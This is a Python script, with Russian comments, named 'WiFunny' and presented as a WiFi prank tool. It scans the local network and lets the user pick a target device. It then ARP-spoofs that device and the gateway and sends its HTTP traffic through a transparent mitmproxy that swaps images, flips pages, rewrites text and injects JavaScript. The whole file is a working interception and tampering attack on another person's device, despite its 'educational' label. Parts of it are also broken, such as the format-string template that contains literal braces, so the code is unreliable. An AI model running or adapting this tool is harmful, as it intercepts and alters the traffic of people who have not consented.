#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFunny - WiFi Prank Tool for Termux with Kali Linux
Перенаправляет веб-страницы на шуточные версии в WiFi-сети.
"""

import os
import sys
import time
import signal
import subprocess
import re
import random
from threading import Thread

# Проверка root-доступа
if os.geteuid() != 0:
    print("[!] Этот скрипт требует root-привилегий!")
    print("[i] Запустите: sudo python3 wifunny.py")
    sys.exit(1)

# Цвета для вывода
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Глобальные переменные
running = True
target_ip = ""
gateway_ip = ""
interface = ""
prank_type = ""
prank_duration = 0
start_time = 0

def print_banner():
    """Выводит баннер программы"""
    os.system("clear")
    print(f"{Colors.BOLD}{Colors.GREEN}")
    print(r"""
 __        ___ _____                         
 \ \      / (_)  ___|   _ _ __  _ __  _   _ 
  \ \ /\ / /| | |_ | | | | '_ \| '_ \| | | |
   \ V  V / | |  _|| |_| | | | | | | | |_| |
    \_/\_/  |_|_|   \__,_|_| |_|_| |_|\__, |
                                       |___/ 
    """)
    print(f"{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.BLUE}[---] WiFi Пранк-Инструмент для Termux+Kali [---]{Colors.ENDC}")
    print(f"{Colors.YELLOW}[i] Создано для образовательных целей и безобидных шуток{Colors.ENDC}")
    print("\n")

def check_dependencies():
    """Проверяет наличие необходимых зависимостей"""
    tools = ["arpspoof", "mitmproxy", "python3", "iptables", "ip"]
    missing_tools = []
    
    print(f"{Colors.BLUE}[*] Проверка необходимых инструментов...{Colors.ENDC}")
    for tool in tools:
        try:
            subprocess.check_call(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}[✓] {tool} установлен{Colors.ENDC}")
        except subprocess.CalledProcessError:
            print(f"{Colors.RED}[✗] {tool} не найден{Colors.ENDC}")
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"{Colors.RED}[!] Отсутствуют необходимые инструменты: {', '.join(missing_tools)}{Colors.ENDC}")
        print(f"{Colors.YELLOW}[i] Запустите setup.py для установки зависимостей:{Colors.ENDC}")
        print(f"{Colors.GREEN}    python3 setup.py{Colors.ENDC}")
        sys.exit(1)
    
    print(f"{Colors.GREEN}[✓] Все зависимости установлены!{Colors.ENDC}")
    return True

def get_network_info():
    """Получает информацию о сети"""
    global interface, gateway_ip
    
    print(f"{Colors.BLUE}[*] Получение информации о сети...{Colors.ENDC}")
    
    # Получение списка интерфейсов
    interfaces = []
    try:
        result = subprocess.check_output(["ip", "link", "show"]).decode("utf-8")
        for line in result.split('\n'):
            if ': ' in line and not 'lo:' in line:
                interface_name = line.split(': ')[1]
                interfaces.append(interface_name)
    except subprocess.CalledProcessError:
        print(f"{Colors.RED}[!] Не удалось получить список интерфейсов{Colors.ENDC}")
        sys.exit(1)
    
    # Выбор интерфейса
    if len(interfaces) == 0:
        print(f"{Colors.RED}[!] Сетевые интерфейсы не найдены{Colors.ENDC}")
        sys.exit(1)
    elif len(interfaces) == 1:
        interface = interfaces[0]
    else:
        print(f"{Colors.YELLOW}[i] Доступные интерфейсы:{Colors.ENDC}")
        for i, iface in enumerate(interfaces):
            print(f"{Colors.GREEN}    {i+1}. {iface}{Colors.ENDC}")
        
        while True:
            try:
                choice = int(input(f"{Colors.BLUE}[?] Выберите интерфейс (1-{len(interfaces)}): {Colors.ENDC}"))
                if 1 <= choice <= len(interfaces):
                    interface = interfaces[choice-1]
                    break
                else:
                    print(f"{Colors.RED}[!] Некорректный выбор{Colors.ENDC}")
            except ValueError:
                print(f"{Colors.RED}[!] Введите число{Colors.ENDC}")
    
    print(f"{Colors.GREEN}[✓] Выбран интерфейс: {interface}{Colors.ENDC}")
    
    # Получение IP-адреса шлюза
    try:
        result = subprocess.check_output(["ip", "route", "show", "default"]).decode("utf-8")
        gateway_ip = result.split("default via ")[1].split(" ")[0]
        print(f"{Colors.GREEN}[✓] IP-адрес шлюза: {gateway_ip}{Colors.ENDC}")
    except (subprocess.CalledProcessError, IndexError):
        print(f"{Colors.RED}[!] Не удалось определить IP-адрес шлюза{Colors.ENDC}")
        gateway_ip = input(f"{Colors.BLUE}[?] Введите IP-адрес шлюза вручную: {Colors.ENDC}")
    
    return True

def scan_network():
    """Сканирует сеть и выводит список устройств"""
    global gateway_ip, interface
    
    print(f"{Colors.BLUE}[*] Сканирование сети...{Colors.ENDC}")
    print(f"{Colors.YELLOW}[i] Это может занять некоторое время...{Colors.ENDC}")
    
    # Получение нашего IP-адреса
    try:
        result = subprocess.check_output(["ip", "addr", "show", interface]).decode("utf-8")
        our_ip = re.search(r'inet\s+([0-9.]+)', result).group(1)
        network = our_ip.rsplit('.', 1)[0]
    except (subprocess.CalledProcessError, AttributeError):
        print(f"{Colors.RED}[!] Не удалось определить наш IP-адрес{Colors.ENDC}")
        network = gateway_ip.rsplit('.', 1)[0]
    
    # Сканирование сети с помощью ARP-запросов
    devices = []
    try:
        for i in range(1, 255):
            ip = f"{network}.{i}"
            
            # Пропускаем наш IP и шлюз
            if ip == our_ip or ip == gateway_ip:
                continue
                
            # Отправляем ping для обновления ARP-таблицы
            subprocess.call(
                ["ping", "-c", "1", "-W", "0.1", ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    except KeyboardInterrupt:
        print(f"{Colors.YELLOW}[i] Сканирование прервано пользователем{Colors.ENDC}")
    
    # Получение ARP-таблицы
    try:
        result = subprocess.check_output(["arp", "-a"]).decode("utf-8")
        for line in result.split('\n'):
            if "(" in line and ")" in line:
                try:
                    ip = line.split("(")[1].split(")")[0]
                    mac = line.split("at ")[1].split(" ")[0]
                    
                    # Пропускаем наш IP и шлюз
                    if ip == our_ip or ip == gateway_ip:
                        continue
                        
                    devices.append((ip, mac))
                except IndexError:
                    pass
    except subprocess.CalledProcessError:
        print(f"{Colors.RED}[!] Не удалось получить ARP-таблицу{Colors.ENDC}")
    
    if not devices:
        print(f"{Colors.RED}[!] Устройства в сети не найдены{Colors.ENDC}")
        return None
    
    print(f"{Colors.GREEN}[✓] Найдено {len(devices)} устройств{Colors.ENDC}")
    print(f"{Colors.YELLOW}[i] Доступные цели:{Colors.ENDC}")
    
    for i, (ip, mac) in enumerate(devices):
        print(f"{Colors.GREEN}    {i+1}. {ip} ({mac}){Colors.ENDC}")
    
    while True:
        try:
            choice = int(input(f"{Colors.BLUE}[?] Выберите цель (1-{len(devices)}): {Colors.ENDC}"))
            if 1 <= choice <= len(devices):
                target_ip = devices[choice-1][0]
                print(f"{Colors.GREEN}[✓] Выбрана цель: {target_ip}{Colors.ENDC}")
                return target_ip
            else:
                print(f"{Colors.RED}[!] Некорректный выбор{Colors.ENDC}")
        except ValueError:
            print(f"{Colors.RED}[!] Введите число{Colors.ENDC}")
    
    return None

def select_prank():
    """Выбор типа пранка"""
    global prank_type, prank_duration
    
    print(f"{Colors.BLUE}[*] Выбор типа пранка:{Colors.ENDC}")
    pranks = [
        "Замена изображений на мемы",
        "Переворот страниц",
        "Замена текста на забавный",
        "Падающий текст",
        "Случайный эффект"
    ]
    
    for i, prank in enumerate(pranks):
        print(f"{Colors.GREEN}    {i+1}. {prank}{Colors.ENDC}")
    
    while True:
        try:
            choice = int(input(f"{Colors.BLUE}[?] Выберите тип пранка (1-{len(pranks)}): {Colors.ENDC}"))
            if 1 <= choice <= len(pranks):
                prank_type = choice
                print(f"{Colors.GREEN}[✓] Выбран пранк: {pranks[choice-1]}{Colors.ENDC}")
                break
            else:
                print(f"{Colors.RED}[!] Некорректный выбор{Colors.ENDC}")
        except ValueError:
            print(f"{Colors.RED}[!] Введите число{Colors.ENDC}")
    
    while True:
        try:
            duration = int(input(f"{Colors.BLUE}[?] Введите продолжительность пранка (в минутах): {Colors.ENDC}"))
            if duration > 0:
                prank_duration = duration * 60  # Конвертация в секунды
                print(f"{Colors.GREEN}[✓] Продолжительность: {duration} мин.{Colors.ENDC}")
                break
            else:
                print(f"{Colors.RED}[!] Введите положительное число{Colors.ENDC}")
        except ValueError:
            print(f"{Colors.RED}[!] Введите число{Colors.ENDC}")
    
    return True

def enable_ip_forwarding():
    """Включает перенаправление IP-пакетов"""
    print(f"{Colors.BLUE}[*] Включение перенаправления IP-пакетов...{Colors.ENDC}")
    try:
        subprocess.check_call(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(f"{Colors.GREEN}[✓] Перенаправление IP-пакетов включено{Colors.ENDC}")
        return True
    except subprocess.CalledProcessError:
        print(f"{Colors.RED}[!] Не удалось включить перенаправление IP-пакетов{Colors.ENDC}")
        return False

def start_arp_spoofing(target_ip, gateway_ip):
    """Запускает ARP-спуфинг"""
    print(f"{Colors.BLUE}[*] Запуск ARP-спуфинга...{Colors.ENDC}")
    try:
        # Запуск ARP-спуфинга в обе стороны
        arp_spoof_target = subprocess.Popen(
            ["arpspoof", "-i", interface, "-t", target_ip, gateway_ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        arp_spoof_gateway = subprocess.Popen(
            ["arpspoof", "-i", interface, "-t", gateway_ip, target_ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        print(f"{Colors.GREEN}[✓] ARP-спуфинг запущен{Colors.ENDC}")
        return (arp_spoof_target, arp_spoof_gateway)
    except subprocess.CalledProcessError:
        print(f"{Colors.RED}[!] Не удалось запустить ARP-спуфинг{Colors.ENDC}")
        return (None, None)

def setup_iptables(port=8080):
    """Настраивает правила iptables для перенаправления трафика"""
    print(f"{Colors.BLUE}[*] Настройка правил iptables...{Colors.ENDC}")
    try:
        # Очистка существующих правил
        subprocess.check_call(
            ["iptables", "-F"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Перенаправление HTTP-трафика на прокси
        subprocess.check_call(
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", str(port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        print(f"{Colors.GREEN}[✓] Правила iptables настроены{Colors.ENDC}")
        return True
    except subprocess.CalledProcessError:
        print(f"{Colors.RED}[!] Не удалось настроить правила iptables{Colors.ENDC}")
        return False

def generate_mitmproxy_config():
    """Генерирует конфигурацию для mitmproxy на основе выбранного пранка"""
    print(f"{Colors.BLUE}[*] Генерация конфигурации mitmproxy...{Colors.ENDC}")
    
    config_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "addons.py")
    
    with open(config_path, "w") as f:
        f.write("""
from mitmproxy import http
import random
import re
import os

# Путь к директории с ресурсами
RESOURCE_DIR = os.path.join(os.path.dirname(os.path.realpath(__file__)), "resources")

# Тип пранка (1-5)
PRANK_TYPE = {prank_type}

# Список мемов
MEMES = [
    "meme1.jpg",
    "meme2.jpg",
    "meme3.jpg",
    "meme4.jpg",
    "meme5.jpg"
]

# Список забавных замен текста
FUNNY_TEXT_REPLACEMENTS = [
    (r'\\bважн(ый|ая|ое|ые)\\b', 'смешн\\1'),
    (r'\\bсрочно\\b', 'не очень срочно'),
    (r'\\bновост(ь|и)\\b', 'выдумк\\1'),
    (r'\\bэксперт(ы)?\\b', 'человек\\1, который думает, что всё знает'),
    (r'\\bисследование показало\\b', 'кто-то где-то сказал'),
    (r'\\bученые\\b', 'люди в белых халатах'),
    (r'\\bофициально\\b', 'почти точно'),
    (r'\\bсогласно источникам\\b', 'я где-то слышал'),
    (r'\\bв ходе эксперимента\\b', 'методом тыка'),
]

def response(flow: http.HTTPFlow) -> None:
    # Пропускаем не HTTP-ответы
    if flow.response is None:
        return
    
    # Пропускаем не HTML-страницы
    if "text/html" not in flow.response.headers.get("content-type", ""):
        return
    
    # Замена изображений на мемы
    if PRANK_TYPE == 1 or PRANK_TYPE == 5 and random.random() < 0.3:
        if "image" in flow.response.headers.get("content-type", ""):
            # Открываем случайный мем
            meme_path = os.path.join(RESOURCE_DIR, "memes", random.choice(MEMES))
            if os.path.exists(meme_path):
                with open(meme_path, "rb") as f:
                    flow.response.content = f.read()
                    flow.response.headers["content-type"] = "image/jpeg"
        
        # Заменяем все img src на мемы в HTML
        elif "text/html" in flow.response.headers.get("content-type", ""):
            content = flow.response.text
            # Находим все img src
            for img in re.findall(r'<img[^>]+src\\s*=\\s*["\\\']([^"\\\']+)["\\\']', content):
                meme = random.choice(MEMES)
                content = content.replace(img, f"/resources/memes/{meme}")
            flow.response.text = content
    
    # Переворот страниц
    elif PRANK_TYPE == 2 or PRANK_TYPE == 5 and random.random() < 0.3:
        if "text/html" in flow.response.headers.get("content-type", ""):
            content = flow.response.text
            
            # Добавляем CSS для переворота страницы
            flip_styles = """
            <style>
            body {
                transform: rotate(180deg);
                transform-origin: center center;
            }
            </style>
            """
            
            # Вставляем стили перед закрывающим тегом </head>
            if "</head>" in content:
                content = content.replace("</head>", flip_styles + "</head>")
            else:
                content = flip_styles + content
            
            flow.response.text = content
    
    # Замена текста на забавный
    elif PRANK_TYPE == 3 or PRANK_TYPE == 5 and random.random() < 0.3:
        if "text/html" in flow.response.headers.get("content-type", ""):
            content = flow.response.text
            
            # Применяем все забавные замены
            for pattern, replacement in FUNNY_TEXT_REPLACEMENTS:
                content = re.sub(pattern, replacement, content)
            
            flow.response.text = content
    
    # Падающий текст
    elif PRANK_TYPE == 4 or PRANK_TYPE == 5 and random.random() < 0.3:
        if "text/html" in flow.response.headers.get("content-type", ""):
            content = flow.response.text
            
            # Добавляем JS для эффекта падающего текста
            falling_text_js = """
            <script>
            document.addEventListener('DOMContentLoaded', function() {
                const paragraphs = document.querySelectorAll('p, h1, h2, h3, h4, h5, h6, span, a');
                
                paragraphs.forEach(function(p) {
                    if (p.textContent.trim().length > 0) {
                        p.style.position = 'relative';
                        p.style.transition = 'top 1s ease-in-out';
                        
                        setTimeout(function() {
                            p.style.top = Math.floor(Math.random() * 300) + 'px';
                        }, Math.random() * 3000);
                    }
                });
            });
            </script>
            """
            
            # Вставляем JS перед закрывающим тегом </body>
            if "</body>" in content:
                content = content.replace("</body>", falling_text_js + "</body>")
            else:
                content = content + falling_text_js
            
            flow.response.text = content
""".format(prank_type=prank_type))
    
    print(f"{Colors.GREEN}[✓] Конфигурация mitmproxy сгенерирована: {config_path}{Colors.ENDC}")
    return config_path

def start_mitmproxy(config_path):
    """Запускает mitmproxy с указанной конфигурацией"""
    print(f"{Colors.BLUE}[*] Запуск mitmproxy...{Colors.ENDC}")
    try:
        # Создаем директории для ресурсов, если они не существуют
        resources_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), "resources/memes")
        os.makedirs(resources_dir, exist_ok=True)
        
        # Запускаем mitmproxy
        mitmproxy_process = subprocess.Popen(
            ["mitmdump", "-s", config_path, "--mode", "transparent"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        print(f"{Colors.GREEN}[✓] mitmproxy запущен{Colors.ENDC}")
        return mitmproxy_process
    except subprocess.CalledProcessError:
        print(f"{Colors.RED}[!] Не удалось запустить mitmproxy{Colors.ENDC}")
        return None

def cleanup(arp_spoof_target, arp_spoof_gateway, mitmproxy_process):
    """Очищает все настройки и останавливает процессы"""
    print(f"{Colors.BLUE}[*] Очистка...{Colors.ENDC}")
    
    # Остановка ARP-спуфинга
    if arp_spoof_target:
        arp_spoof_target.terminate()
    if arp_spoof_gateway:
        arp_spoof_gateway.terminate()
    
    # Остановка mitmproxy
    if mitmproxy_process:
        mitmproxy_process.terminate()
    
    # Очистка правил iptables
    try:
        subprocess.check_call(
            ["iptables", "-F"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        subprocess.check_call(
            ["iptables", "-t", "nat", "-F"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except subprocess.CalledProcessError:
        pass
    
    # Отключение перенаправления IP-пакетов
    try:
        subprocess.check_call(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except subprocess.CalledProcessError:
        pass
    
    print(f"{Colors.GREEN}[✓] Очистка завершена{Colors.ENDC}")

def signal_handler(sig, frame):
    """Обработчик сигнала прерывания"""
    global running
    print(f"\n{Colors.YELLOW}[i] Получен сигнал прерывания{Colors.ENDC}")
    running = False

def monitor_time():
    """Мониторинг времени работы пранка"""
    global running, start_time, prank_duration
    
    start_time = time.time()
    
    while running:
        # Проверка времени работы
        elapsed = time.time() - start_time
        remaining = prank_duration - elapsed
        
        if remaining <= 0:
            print(f"\n{Colors.YELLOW}[i] Время пранка истекло{Colors.ENDC}")
            running = False
            break
        
        # Вывод оставшегося времени
        mins = int(remaining // 60)
        secs = int(remaining % 60)
        print(f"\r{Colors.BLUE}[*] Пранк активен: {mins:02d}:{secs:02d} осталось{Colors.ENDC}", end="")
        
        time.sleep(1)

def main():
    """Основная функция"""
    global running, target_ip, gateway_ip, interface, prank_type, prank_duration
    
    # Регистрация обработчика сигналов
    signal.signal(signal.SIGINT, signal_handler)
    
    # Вывод баннера
    print_banner()
    
    # Проверка зависимостей
    if not check_dependencies():
        return
    
    # Получение информации о сети
    if not get_network_info():
        return
    
    # Сканирование сети
    target_ip = scan_network()
    if not target_ip:
        return
    
    # Выбор типа пранка
    if not select_prank():
        return
    
    # Включение перенаправления IP-пакетов
    if not enable_ip_forwarding():
        return
    
    # Настройка правил iptables
    if not setup_iptables():
        return
    
    # Генерация конфигурации mitmproxy
    config_path = generate_mitmproxy_config()
    
    # Запуск ARP-спуфинга
    arp_spoof_target, arp_spoof_gateway = start_arp_spoofing(target_ip, gateway_ip)
    if not arp_spoof_target or not arp_spoof_gateway:
        cleanup(None, None, None)
        return
    
    # Запуск mitmproxy
    mitmproxy_process = start_mitmproxy(config_path)
    if not mitmproxy_process:
        cleanup(arp_spoof_target, arp_spoof_gateway, None)
        return
    
    print(f"\n{Colors.GREEN}[✓] Пранк успешно запущен!{Colors.ENDC}")
    print(f"{Colors.YELLOW}[i] Нажмите Ctrl+C для остановки{Colors.ENDC}")
    
    # Запуск мониторинга времени в отдельном потоке
    monitor_thread = Thread(target=monitor_time)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Ожидание прерывания
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[i] Прерывание пользователем{Colors.ENDC}")
    finally:
        # Очистка
        cleanup(arp_spoof_target, arp_spoof_gateway, mitmproxy_process)
        print(f"\n{Colors.GREEN}[✓] Пранк завершен{Colors.ENDC}")

if __name__ == "__main__":
    main()
